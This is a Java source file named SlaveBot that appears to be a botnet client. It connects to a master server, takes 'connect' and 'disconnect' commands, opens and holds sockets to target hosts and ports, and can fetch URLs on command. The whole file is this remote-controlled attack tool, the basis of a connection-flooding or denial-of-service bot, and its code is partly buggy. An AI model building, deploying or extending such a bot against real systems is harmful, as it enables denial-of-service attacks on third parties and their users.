import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.util.*;
import java.text.*;


class Connection{
String 	Date;
String 	HostIP;
String 	HostName;
int	PORT;
Socket 	ss;
  	Connection() {
  		Date date = new Date();
  		SimpleDateFormat f = new SimpleDateFormat("yyyy-MM-dd");
  		String format = f.format(date);
  		Date=format;
  }
}


public class SlaveBot {

  public static ArrayList<Connection> ls;
  public static Socket s;

  public static void main(String[] args) throws Exception
  {
	if (args.length<4)
	{
	  System.err.println("port number and host details are compulsory.");
	  System.exit(-1);	
	}
	String hname = "";
	String p = "";

	for(int t=0; t<3; t++)
	{
		if(args[t].equals("-h"))
		{
			hname=args[t+1];
		}
		
		else if(args[t].equals("-p"))
		{
			p=args[t+1];
		}
	}

    if (hname.equals("") || p.equals(""))
    {	
    	System.err.println("port number is compulsory.");
    	System.exit(-1);
	}

    ls = new ArrayList<Connection>();
	try{
    		Integer.parseInt(p);
	}
	catch(Exception e)
	{
		System.err.println("port number always be in integer.");
		System.exit(-1);
	}
    s = new Socket(hname, Integer.parseInt(p));
    BufferedReader netIn = new BufferedReader(new InputStreamReader(s.getInputStream()));
    Connection socketList;
    while(true)
    {
    	try
    	{
    		String str = netIn.readLine();
    		if(str !="")
    		{
    			String[] Cmd = str.split(" ");
    			if(Cmd[0].equals("connect"))
    			{
    				if(Cmd[1] != null && Cmd[2]!= null && Cmd[3]!= null)
    				{    	
    					String target_hostname = Cmd[1];
    					int target_port = Integer.parseInt(Cmd[2].toString());
    					int n=1;
			
    					Socket targetSocket;
    					for (int i=0; i< n; i++)
    					{
    						try 
    						{	
				    			targetSocket = new Socket(InetAddress.getByName(target_hostname), target_port);
							    socketList=new Connection();
							    socketList.HostIP=targetSocket.getInetAddress().getHostAddress();
							    socketList.HostName=targetSocket.getInetAddress().getHostName();
							    socketList.PORT=target_port;
							    socketList.ss=targetSocket;
							    ls.add(socketList);
							    if(Cmd[4].equals("keepalive"))
							    	targetSocket.setKeepAlive(true);
							    if(Cmd[4].contains("url"))
							    	SendHttpCommand(Cmd[4]);
							    System.out.println(" connectted to " +targetSocket.getInetAddress().getHostName()+":"+ targetSocket.getInetAddress().getHostAddress()+" at local port:  " + targetSocket.getLocalPort()+" setkeepalive= "+targetSocket.getKeepAlive());
	            			} 
    						catch(Exception e)
    						{
    							e.printStackTrace();
    							System.exit(-1);
    						}

    					}
			
    				}
    				else
    				{
    					System.out.println("Illegal arguments for connect");
    					System.exit(-1);
    				}

    			}
    			else if(Cmd[0].equals("disconnect"))
    			{
    				if(Cmd[1]!= null )
    				{ 
	
    					ArrayList<Connection> s = new ArrayList<Connection>();
    					Iterator iterator = ls.iterator();
    					while (iterator.hasNext())
    					{
    						Connection o = (Connection) iterator.next();
    						if(!s.contains(o)) s.add(o);
    					}
			
    					int flag=0;
    					String target = Cmd[1];

    					if (target!="all"){flag=1; }
    					else {	flag=0;}

    					int target_port=0;
    					if(Cmd[2]!= null )
    					{			
    						target_port= Integer.parseInt(Cmd[2].toString());
    					}
    					Iterator<Connection> it = s.iterator();
    					if(flag==1)
    					{ 
    						while(it.hasNext()) 
    						{
    							Connection s1 = it.next();
    							if(target_port==0)
    							{
    								if(s1.HostIP.equals(target))
    								{
    									s1.ss.close();
    									it.remove();
    								}
    							}
    							else
    							{
    								if(s1.HostIP.equals(target) && s1.PORT==target_port)
    								{
    									s1.ss.close();
    									it.remove();
    								}
    							} 
    						}
    					}
    					else if(flag==0)
    					{	
    						while (it.hasNext())
    						{
    							Connection s1 = it.next(); 
    							if(target_port==0)
    							{
    								if(s1.HostName.equals(target))
    								{
    									s1.ss.close();
    									it.remove();
    								}
    							}
    							else
    							{
    								if(s1.HostName.equals(target) && s1.PORT==target_port)
    								{
    									s1.ss.close();
    									it.remove();
    								}
    							}
				   
    						}
    					}	
    				}
    			}
    			else
    			{
    				System.out.println("Illegal arguments for disconnect");
    				System.exit(-1);
    			}	
    		}
    		else
    		{
    			System.out.println(" Illegal command. ");
    			System.exit(-1);
    		}
    	}
		catch (Exception e) 
		{
	      	e.printStackTrace();
	      	System.exit(-1);
		}  	
    }  
 }

private static void SendHttpCommand(String str) {
	str=str.replace("url=", "");
	URL u;
	try{
		u = new URL(str);		
		URLConnection c = u.openConnection();		
    	BufferedReader in = new BufferedReader(
    							new InputStreamReader(
    									c.getInputStream()));		
    	String input;                
    	input = in.readLine();        	
    	if(input==null)
    		System.out.println("Not recieved anything.");
    	else	
    		in.close();        	
        if(input.contains("doctype"))
        	System.out.println("request is correct");
        else{
        	System.out.println("Illegal request");
        }
	} catch (IOException e) {
		e.printStackTrace();
	}
	
}

}


